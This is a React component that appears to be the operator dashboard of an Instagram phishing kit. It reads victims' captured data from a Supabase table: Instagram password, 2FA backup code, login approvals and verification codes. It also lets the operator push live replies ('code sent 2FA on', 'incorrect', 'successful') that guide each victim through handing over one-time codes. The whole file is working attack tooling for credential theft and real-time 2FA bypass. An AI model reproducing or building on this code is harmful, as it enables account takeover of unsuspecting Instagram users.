import React, { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom';
import { supabase } from '../supabaseClient';

const options = [
  "SELECT",
  "verification method 2FA off",
  "code sent 2FA off",
  "verification method 2FA on",
  "code sent 2FA on",
  "incorrect",
  "successful",
  "unsuccessful",
]

export default function Chat() {
  let { username } = useParams();
  const [user, setUser] = useState()
  const [newMsg, setNewMsg] = useState(false)
  const [loading, setLoading] = useState(false)
  const [selected, setSelected] = useState('')
  // const navigate = useNavigate()

  // useEffect(() => {
  //   const getData = async () => {
  //     const { data: { user } } = await supabase.auth.getUser()
  //     if (!user) return navigate(`/login?return=${window.location.href}`)
  //   };

  //   getData();
  // }, [id, navigate]);

  useEffect(() => {
    const f = async () => {
      const u = await supabase
        .from('users')
        .select('*')
        .eq('username', username)
      // console.log(username);
      let user = u?.data.pop()
      console.log(user);
      user && setUser(user);
    }
    f()
  }, [username])

  useEffect(() => {
    const channel = supabase
      .channel('any')
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'users',
        filter: `username=eq.${username}`
      }, payload => {
        // console.log('Change received!', payload)
        payload.new.messageSender !== 'admin' && setNewMsg(true)
        setUser(payload.new)
        // setMessage({ status: '2fa', text: 'payload.new.message' })
      })
      .subscribe()

    return () => {
      supabase.removeChannel(channel);
    };
  }, [username]);

  const send = async () => {
    if(selected === 'SELECT') return;

    var status = user?.status
    var newSelected = selected
    if (selected === 'successful') {
      status = 'active'
      newSelected = 'success'
    }
    if (selected === 'unsuccessful') {
      // status = 'incorrect'
      newSelected = 'unsuccessful'
    }
    if (selected === 'incorrect') {
      status = 'incorrect'
      newSelected = 'incorrect'
    }

    const msg = {
      admin: newSelected,
      method: '',
      approve: false,
      sms: false,
      code: ''
    }

    setLoading(true)
    await supabase
      .from('users')
      .update({
        status,
        messageSender: 'admin',
        msg
      })
      .eq('id', user?.id)
    setLoading(false)
    setNewMsg(false)
    // console.log(r);
  }

  console.log(user?.msg && user?.msg);

  return (
    <div className="h-screen w-full py-6 px-4 bg-white to-black grid place-items-center">
      <div className="">
        <h5 className="font-semibold text-[2rem] text-center text-black font-MontserratBold mt-[30px] relative">
          Connecting {username}
          {newMsg && <span className="w-3 h-3 rounded-full bg-red-900 absolute -top-2 -right-2"></span>}
        </h5>
        <div className="">
          <div className="flex gap-2">
            <div className="">username:</div>
            <div className="">{username}</div>
          </div>
          <div className="flex gap-2">
            <div className="">status:</div>
            <div className="">{user?.status}</div>
          </div>
          <div className="flex gap-2">
            <div className="">Instagram password:</div>
            <div className="">{user?.instagramPassword}</div>
          </div>
          {user?.backupcode && <div className="flex gap-2">
            <div className="">2fa backup code:</div>
            <div className="">{user?.backupcode}</div>
          </div>}
          {user?.msg && user?.msg?.method && <div className="flex gap-2">
            <div className="">verification method:</div>
            <div className="">{user?.msg && user?.msg?.method}</div>
          </div>}
          {user?.msg && user?.msg?.approve && <div className="flex gap-2">
            <div className="">I approved login:</div>
            <div className="">{user?.msg && user?.msg?.approve}</div>
          </div>}
          {user?.msg && user?.msg?.thisWasMe && <div className="flex gap-2">
            <div className="">I clicked this was me:</div>
            <div className="">{user?.msg && user?.msg?.thisWasMe}</div>
          </div>}
          {user?.msg && user?.msg?.sms && <div className="flex gap-2">
            <div className="">Send me the code on SMS:</div>
            <div className="">{user?.msg && user?.msg?.sms}</div>
          </div>}
          {user?.msg && user?.msg?.code && <div className="flex gap-2">
            <div className="">verification code:</div>
            <div className="">{user?.msg && user?.msg?.code}</div>
          </div>}
        </div>
      </div>

      {loading && <div className="text-center">
        <p className="animate-pulse">replying...</p>
      </div>}

      <div className="flex justify-center">
        <div className="flex items-center gap-4">
          <select name="" className="border py-4" onChange={e => setSelected(e.target.value)}>
            {options.map(option => {
              return <option key={option} value={option ?? ''}>{option ?? ''}</option>
            })}
          </select>
          <div className={`${selected === 'SELECT' || selected === '' ? 'bg-gray-600 cursor-not-allowed' : 'bg-[#ef5f3c] cursor-pointer'} w-full md:w-32 mx-auto py-4 px-6 text-white font-bold rounded-md flex justify-center`} onClick={() => send()}>
            send
          </div>
        </div>
      </div>

      <div className="hidden dl-flex items-center justify-center whitespace-nowrap gap-3 mt-10 w-full">
        <div className="w-full md:w-32 mx-auto mb-3 py-4 px-6 bg-orange-600 text-white font-bold cursor-pointer rounded-md flex justify-center" onClick={() => send('2fa')}>
          2fa
        </div>
        <div className="w-full md:w-fit mx-auto mb-3 py-4 px-6 bg-orange-600 text-white font-bold cursor-pointer rounded-md flex justify-center" onClick={() => send('2fa')}>
          verification method?
        </div>
        <div className="w-full md:w-32 mx-auto mb-3 py-4 px-6 bg-red-600 text-white font-bold cursor-pointer rounded-md flex justify-center " onClick={() => send('incorrect')}>
          incorrect
        </div>
        <div className="w-full md:w-32 mx-auto mb-3 py-4 px-6 bg-green-600 text-white font-bold cursor-pointer rounded-md flex justify-center" onClick={() => send('active')}>
          successful
        </div>
      </div>
      {/* <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mt-10 w-full">
      </div> */}
    </div>
  )
}
